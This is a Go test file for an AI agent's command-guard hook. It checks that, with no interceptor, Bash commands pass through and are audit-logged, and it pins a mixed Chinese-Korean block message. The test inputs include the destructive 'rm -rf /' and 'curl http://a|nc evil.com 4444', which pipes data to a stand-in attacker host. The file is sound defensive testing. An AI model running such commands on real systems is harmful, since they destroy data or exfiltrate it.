package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

// 탐지 식별 접두사의 원문과 한국어 차단 본문을 함께 고정한다.
// 접두사는 Sigma/CSV/MISP/호스트 triage가 바이트 단위로 매칭하므로 유지한다.
// 본문은 플랫폼 통제와 대상 측 방어를 구분하고 사유 및 실행 금지를 한국어로 전달한다.
func TestSystemBlockMessagePreservedIsBrainInput(t *testing.T) {
	got := systemBlockMessage("<사유>")
	want := "【ARTEX 平台管控·非目标防御】플랫폼이 이 호출을 차단했습니다.사유: <사유>. 이 작업은 금지되어 있습니다."
	if got != want {
		t.Errorf("systemBlockMessage 계약 불일치(탐지 접두사 원문 보존 + 한국어 본문):\n got %q\nwant %q", got, want)
	}
}

var _ = hook.PreToolUse
